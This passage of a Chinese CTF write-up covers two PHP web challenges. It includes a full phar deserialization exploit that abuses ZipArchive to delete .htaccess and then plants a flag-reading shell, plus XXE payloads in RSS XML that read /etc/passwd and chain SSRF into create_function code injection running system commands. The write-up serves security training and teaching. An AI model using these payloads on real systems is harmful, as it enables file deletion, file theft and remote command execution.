class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content_check -&gt; check();</span><br><span class="line">        $tmp = explode(<span class="string">"."</span>, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        $ext = end($tmp);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;size &gt; <span class="number">204800</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"your file is too big"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        move_uploaded_file(<span class="keyword">$this</span>-&gt;file_tmp, <span class="keyword">$this</span>-&gt;upload_dir.<span class="string">'/'</span>.md5(<span class="keyword">$this</span>-&gt;filename).<span class="string">'.'</span>.$ext);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $admin;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_admin</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $_SESSION[<span class="string">'password'</span>];</span><br><span class="line">        $secret = <span class="string">"********"</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">"admin"</span> &amp;&amp; <span class="keyword">$this</span>-&gt;password != <span class="string">"admin"</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> ($_COOKIE[<span class="string">'user'</span>] === md5($secret.<span class="keyword">$this</span>-&gt;username.<span class="keyword">$this</span>-&gt;password))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;admin-&gt;open(<span class="keyword">$this</span>-&gt;username, <span class="keyword">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>利用链:</p>
<ul>
<li>上传exp.phar</li>
<li>绕过waf使用<code>php://filter/read=convert.base64-encode/resource=phar://exp.phar</code>触发phar让他反序列中file类的destruct, upload_file触发profile的__call函数, 触发open函数</li>
<li>profile-&gt;admin声明为ZipArchive类, 利用这个原生类的同名函数open来删除原有的.htaccess, 删除完之后再传一个shell就可以了</li>
</ul>
<p>exp:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $filepath;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker = <span class="keyword">new</span> Admin();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $size;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $file_tmp;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $upload_dir;</span><br><span class="line">    <span class="keyword">public</span> $file_error;</span><br><span class="line">    <span class="keyword">public</span> $content_check;</span><br><span class="line">    <span class="keyword">public</span> $obj;</span><br><span class="line">    <span class="keyword">public</span> $filepath;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;size = <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content_check = <span class="keyword">new</span> Profile();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $username;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $admin;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;admin = <span class="keyword">new</span> ZipArchive();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">"/var/www/html/sandbox/76c98b2e4f0f7a9a467bcf459b36ab5c/.htaccess"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = ZipArchive::OVERWRITE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">"exp.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'exp.phar'</span>);</span><br><span class="line">$phar -&gt; startBuffering();</span><br><span class="line">$phar -&gt; setStub(<span class="string">'GIF89a'</span>.<span class="string">'&lt;?php __HALT_COMPILER();?&gt;'</span>);</span><br><span class="line">$phar -&gt; addFromString(<span class="string">'test.txt'</span>,<span class="string">'test'</span>);</span><br><span class="line">$object = <span class="keyword">new</span> File();</span><br><span class="line">$phar -&gt; setMetadata($object);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br></pre></td></tr></table></figure>
<p>shell.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo file_get_contents(&apos;/flag&apos;);</span><br></pre></td></tr></table></figure>
<h2 id="rss">rss</h2>
<p>data protocol format:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data:[&lt;mime type&gt;][;charset=&lt;charset&gt;][;base64],&lt;encoded data&gt;</span><br></pre></td></tr></table></figure>
<p>说是php对mine type不敏感, 那么可以这样子写</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data://baidu.com/plain;base64,xxxxxxxxx==</span><br></pre></td></tr></table></figure>
<p>然后看rss的定义:</p>
<blockquote>
<p>What is RSS?</p>
<p>It is a format to share data, defined in the <a href="https://www.xul.fr/en-xml.php" target="_blank" rel="noopener">1.0 version</a> of XML. You can deliver information in this format et one can get this information, and information from other various sources, in this format. Information provided by a website in an XML file is called an RSS feed.<br>
Recent browsers can read directly RSS files, but a special <strong>RSS reader</strong> or <strong>aggregator</strong> may be used too.</p>
</blockquote>
<p>所以所谓的rss就是xml.</p>
<p>尝试测试</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE title [ &lt;!ELEMENT title ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">rss</span> <span class="attr">version</span>=<span class="string">"2.0"</span> <span class="attr">xmlns:atom</span>=<span class="string">"http://www.w3.org/2005/Atom"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">channel</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>The Blog<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span>&gt;</span>http://example.com/<span class="tag">&lt;/<span class="name">link</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>A blog about things<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">lastBuildDate</span>&gt;</span>Mon, 03 Feb 2014 00:00:00 -0000<span class="tag">&lt;/<span class="name">lastBuildDate</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">link</span>&gt;</span>http://example.com<span class="tag">&lt;/<span class="name">link</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">description</span>&gt;</span>a post<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">author</span>&gt;</span>author@example.com<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pubDate</span>&gt;</span>Mon, 03 Feb 2014 00:00:00 -0000<span class="tag">&lt;/<span class="name">pubDate</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">channel</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">rss</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>将上述内容base64编码之后用之前的data协议传入进去, 触发成功.</p>
<p>接下来就读取源码就行了.</p>
<p>不熟悉MVC架构…读完index.php之后就不知道读什么…</p>
<p>index.php 中有routes.php, 根据routes.php再去读controllers/Admin.php, 然后又去读views/Admin.php</p>
<p>然后关键代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">usort($data, create_function(&apos;$a, $b&apos;, &apos;return strcmp($a-&gt;&apos;.$order.&apos;,$b-&gt;&apos;.$order.&apos;);&apos;));</span><br></pre></td></tr></table></figure>
<p>直接拼接</p>
<p>exp.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE title [ &lt;!ELEMENT title ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=http://127.0.0.1/rss_in_order?rss_url=https://view.news.qq.com/index2010/zhuanti/ztrss.xml&amp;order=%24b%2C%24a)%3B%7Dsystem('cat%20%2Fflag_eb8ba2eb07702e69963a7d6ab8669134')%3B%2F%2F" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">rss</span> <span class="attr">version</span>=<span class="string">"2.0"</span> <span class="attr">xmlns:atom</span>=<span class="string">"http://www.w3.org/2005/Atom"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">channel</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>The Blog<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span>&gt;</span>http://example.com/<span class="tag">&lt;/<span class="name">link</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>A blog about things<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">lastBuildDate</span>&gt;</span>Mon, 03 Feb 2014 00:00:00 -0000<span class="tag">&lt;/<span class="name">lastBuildDate</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">link</span>&gt;</span>http://example.com<span class="tag">&lt;/<span class="name">link</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">description</span>&gt;</span>a post<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">author</span>&gt;</span>author@example.com<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pubDate</span>&gt;</span>Mon, 03 Feb 2014 00:00:00 -0000<span class="tag">&lt;/<span class="name">pubDate</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">channel</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">rss</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$b,$a);&#125;system(&apos;cat /flag_eb8ba2eb07702e69963a7d6ab8669134&apos;);&quot;</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
</search>
